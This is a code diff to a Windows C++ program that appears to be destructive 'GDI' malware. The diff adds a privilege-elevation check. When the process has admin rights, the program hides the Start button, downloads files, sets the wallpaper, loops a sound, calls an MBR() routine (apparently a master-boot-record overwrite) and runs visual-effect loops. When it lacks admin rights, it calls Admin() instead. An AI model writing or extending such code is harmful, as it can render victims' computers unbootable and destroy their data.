@@ -12,6 +12,7 @@ int Melt();
 int Invers();
 int Download();
 int XOR();
+int Admin();
 
 int c = 0;
 
@@ -30,7 +31,7 @@ int loop(){
         Invers();
         c++;
         loop();
-    } else if (c < 2500) {
+    } else if (c < 2350) {
         TextO();
         TextO();
         TextO();
@@ -55,16 +56,29 @@ int loop(){
     return 0;
 }
 
-int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR, int) {
-    HWND hTaskBar = FindWindow(L"Shell_TrayWnd", NULL);
-    HWND hStartButton = GetWindow(hTaskBar, GW_CHILD);
-    ShowWindow(hStartButton, SW_HIDE);
-    Download();
-    char* str = "C:\\Users\\Public\\Downloads\\WP.bmp";
-    PlaySound(L"C:\\Users\\Public\\Downloads\\BG.wav", NULL, SND_LOOP | SND_ASYNC);
-    SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, str, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
-    MBR();
-    loop();
+bool check() {
+    TOKEN_ELEVATION_TYPE token;
+    DWORD size;
+    bool info = GetTokenInformation(GetCurrentProcessToken(), TokenElevationType, &token, sizeof(token), &size);
+    return info && token != TokenElevationTypeLimited;
+}
 
+int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR, int) {
+    bool admincheck = check();
+
+    if (admincheck == false) {
+        Admin();
+        return 0;
+    } else {
+        HWND hTaskBar = FindWindow(L"Shell_TrayWnd", NULL);
+        HWND hStartButton = GetWindow(hTaskBar, GW_CHILD);
+        ShowWindow(hStartButton, SW_HIDE);
+        Download();
+        char* str = "C:\\Users\\Public\\Downloads\\WP.bmp";
+        PlaySound(L"C:\\Users\\Public\\Downloads\\BG.wav", NULL, SND_LOOP | SND_ASYNC);
+        SystemParametersInfoA(SPI_SETDESKWALLPAPER, 0, str, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
+        MBR();
+        loop();
+    }
     return 0;
 }
